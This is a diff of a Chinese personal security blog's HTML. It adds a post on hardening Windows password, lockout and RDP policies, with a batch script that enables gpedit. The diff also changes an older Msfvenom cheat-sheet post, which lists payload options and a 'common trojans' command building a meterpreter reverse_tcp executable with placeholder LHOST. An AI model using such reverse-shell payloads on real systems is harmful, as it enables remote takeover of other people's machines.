@@ -186,6 +186,139 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/17/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E9%85%8D%E7%BD%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Pokerface">
+      <meta itemprop="description" content="花有重开日，人无再少年。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pokerface博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/17/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E9%85%8D%E7%BD%AE/" class="post-title-link" itemprop="url">密码策略配置</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-17 10:13:49 / 修改时间：15:23:30" itemprop="dateCreated datePublished" datetime="2021-11-17T10:13:49+08:00">2021-11-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5/" itemprop="url" rel="index"><span itemprop="name">密码策略</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="密码策略配置"><a href="#密码策略配置" class="headerlink" title="密码策略配置"></a>密码策略配置</h3><p><strong>Windows下的密码配置</strong></p>
+<p>​    <strong>前提：一些windows版本没有组策略，需要自行配置，复制下方内容到txt文本，后缀改为bat或cmd运行即可</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@echo off
+
+<span class="token function">pushd</span> <span class="token string">"%~dp0"</span>
+
+<span class="token function">dir</span> /b C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>servicing<span class="token punctuation">\</span>Packages<span class="token punctuation">\</span>Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum <span class="token operator">></span>List.txt
+
+<span class="token function">dir</span> /b C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>servicing<span class="token punctuation">\</span>Packages<span class="token punctuation">\</span>Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum <span class="token operator">>></span>List.txt
+
+<span class="token keyword">for</span> /f %%i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">'findstr /i . List.txt 2^>nul'</span><span class="token punctuation">)</span> <span class="token keyword">do</span> dism /online /norestart /add-package:<span class="token string">"C:\Windows\servicing\Packages\%%i"</span>
+
+pause<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol>
+<li><p>配置密码复杂性，密码最长使用期限，密码长度最小值不小于八位</p>
+<ul>
+<li>（Win+R输入 gpedit.msc）</li>
+<li>Windows设置-&gt;安全设置-&gt;账户策略-&gt;密码策略-&gt;设置1、密码必须符合复杂性要求（启用），2、密码长度最小值（不小于八位），3、密码最长使用期限</li>
+<li><img src="/images/w1.png"></li>
+<li><img src="/images/w2.jpg"></li>
+<li><img src="/images/w3.png"></li>
+</ul>
+</li>
+<li><p>配置windows登录，五次登录之后，自动锁定账户一分钟</p>
+<ul>
+<li>Windows设置-&gt;安全设置-&gt;账户策略-&gt;账户锁定策略-&gt;1、设置账户锁定阈值（五次）2、账户锁定时间（一分钟）</li>
+<li><img src="/images/w4.png"></li>
+<li><img src="/images/w5.png"></li>
+</ul>
+</li>
+<li><p>设置windows试图登录的用户提示的消息文本内容为For authorized users only</p>
+<ul>
+<li>Windows设置-&gt;安全设置-&gt;本地策略-&gt;安全选项-&gt;交互式登录：试图登录的用户的消息文本</li>
+<li><img src="/images/w6.png"></li>
+</ul>
+</li>
+<li><p>设置windows远程时用户非活动会话链接应小于等于五分钟</p>
+<ul>
+<li>用户配置-&gt;管理面板-&gt;Windows组件-&gt;远程桌面服务-&gt;远程桌面会话主机-&gt;会话时间限制-&gt;设置活动但空闲的远程桌面服务会话的时间限制（启用并设置五分钟）</li>
+<li><img src="/images/w7.png"></li>
+</ul>
+</li>
+<li><p>对windows服务器进行远程管理安全性SSL加固，防止敏感信息泄露被监听</p>
+<ul>
+<li>计算机配置-&gt;管理模板-&gt;Windows组件-&gt;远程桌面服务-&gt;远程桌面会话主机-&gt;安全-&gt;设置</li>
+<li>远程（RDP）连接要求使用指定的安全层（SSL）</li>
+<li>要求安全的RPC通信</li>
+<li>设置客户端连接加密级别（高级别）</li>
+<li><img src="/images/w8.png"></li>
+<li><img src="/images/w9.png"></li>
+<li><img src="/images/w10.png"></li>
+</ul>
+</li>
+<li><p>普通用户进行最小权限管理，对关闭系统仅限超级管理员帐号</p>
+<ul>
+<li>计算机配置-&gt;Windows设置-&gt;安全设置-&gt;本地策略-&gt;用户权限分配-&gt;关闭系统（除administrators外的用户删除）</li>
+<li><img src="/images/w11.png"></li>
+</ul>
+</li>
+<li><p>查找并删除主机可能存在的hacker用户</p>
+<ul>
+<li><img src="/images/w12.png"></li>
+</ul>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/15/Msfvenom/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -236,33 +369,33 @@
       
           <h2 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h2><p>Msfvenom参数：</p>
 <p>用法：/usr/bin/msfvenom[选项]&lt;var=val&gt;</p>
-<p>示例：/usr/bin/msfvenom-p windows/meterpeter/reverse_tcp LHOST=<IP>-f exe-o payload.exe</IP></p>
+<p>示例：/usr/bin/msfvenom-p windows/meterpeter/reverse_tcp LHOST=<IP>-f exe-o payload.exe</p>
 <p>选项：</p>
 <p>-l、 –列出&lt;类型&gt;列出[类型]的所有模块。类型有：有效载荷、编码器、NOP、平台、ARCH、加密、格式等</p>
-<p>-p、 –payload<payload>payload to use（–list payload to list，–list参数选项）。为自定义指定“-”或STDIN</payload></p>
-<p>–列表选项列表–有效载荷<value>的标准、高级和规避选项</value></p>
-<p>-f、 –format<format>输出格式（使用–list要列出的格式）</format></p>
+<p>-p、 –payload<payload>payload to use（–list payload to list，–list参数选项）。为自定义指定“-”或STDIN</p>
+<p>–列表选项列表–有效载荷<value>的标准、高级和规避选项</p>
+<p>-f、 –format<format>输出格式（使用–list要列出的格式）</p>
 <p>-e、 –编码器&lt;编码器&gt;要使用的编码器（使用–列出要列出的编码器）</p>
-<p>–服务名称<value>生成服务二进制文件时要使用的服务名称</value></p>
-<p>–sec name<value>生成大型Windows二进制文件时要使用的新节名。默认值：随机4个字符的alpha字符串</value></p>
+<p>–服务名称<value>生成服务二进制文件时要使用的服务名称</p>
+<p>–sec name<value>生成大型Windows二进制文件时要使用的新节名。默认值：随机4个字符的alpha字符串</p>
 <p>–使用所有可用编码器生成尽可能最小的有效负载</p>
-<p>–encrypt<value>要应用于外壳代码的加密或编码类型（使用–list encrypt to list）</value></p>
-<p>–加密密钥<value>用于–encrypt的密钥</value></p>
-<p>–encrypt iv<value>的初始化向量–encrypt</value></p>
-<p>-a、 –arch<arch>用于–payload和–encoder的体系结构（使用–list-arch列出）</arch></p>
-<p>–平台<platform>platform for–payload（使用–list要列出的平台）</platform></p>
-<p>-o、 –out<path></path>将有效负载保存到文件</p>
-<p>-b、 –要避免的坏字符<list>示例：’\x00\xff’</list></p>
-<p>-n、 –nopled<length>将[length]大小的nopled预先发送到有效负载上</length></p>
-<p>–pad NOP使用-n<length>指定的nopsled大小作为总有效负载大小，自动预加nopsled数量（nops减去有效负载长度）</length></p>
+<p>–encrypt<value>要应用于外壳代码的加密或编码类型（使用–list encrypt to list）</p>
+<p>–加密密钥<value>用于–encrypt的密钥</p>
+<p>–encrypt iv<value>的初始化向量–encrypt</p>
+<p>-a、 –arch<arch>用于–payload和–encoder的体系结构（使用–list-arch列出）</p>
+<p>–平台<platform>platform for–payload（使用–list要列出的平台）</p>
+<p>-o、 –out<path>将有效负载保存到文件</p>
+<p>-b、 –要避免的坏字符<list>示例：’\x00\xff’</p>
+<p>-n、 –nopled<length>将[length]大小的nopled预先发送到有效负载上</p>
+<p>–pad NOP使用-n<length>指定的nopsled大小作为总有效负载大小，自动预加nopsled数量（nops减去有效负载长度）</p>
 <p>-s、 –空间&lt;长度&gt;产生的有效载荷的最大尺寸</p>
 <p>–编码器空间&lt;长度&gt;编码有效负载的最大大小（默认为-s值）</p>
 <p>-i、 –迭代&lt;计数&gt;对有效负载进行编码的次数</p>
-<p>-c、 –添加代码<path></path>指定要包含的其他win32外壳代码文件</p>
-<p>-x、 –template<path></path>指定要用作模板的自定义可执行文件</p>
+<p>-c、 –添加代码<path>指定要包含的其他win32外壳代码文件</p>
+<p>-x、 –template<path>指定要用作模板的自定义可执行文件</p>
 <p>-k、 –保留–template行为并将有效负载作为新线程注入</p>
-<p>-v、 –var name<value>指定用于某些输出格式的自定义变量名</value></p>
-<p>-t、 –timeout<second>从STDIN读取有效负载时等待的秒数（默认值为30，0表示禁用）</second></p>
+<p>-v、 –var name<value>指定用于某些输出格式的自定义变量名</p>
+<p>-t、 –timeout<second>从STDIN读取有效负载时等待的秒数（默认值为30，0表示禁用）</p>
 <p>常用木马：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Windows:
 格式：msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f exe <span class="token operator">></span> shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -352,7 +485,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-11-16 08:55:51" itemprop="dateModified" datetime="2021-11-16T08:55:51+08:00">2021-11-16</time>
+                <time title="修改时间：2021-11-16 08:58:15" itemprop="dateModified" datetime="2021-11-16T08:58:15+08:00">2021-11-16</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -895,20 +1028,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
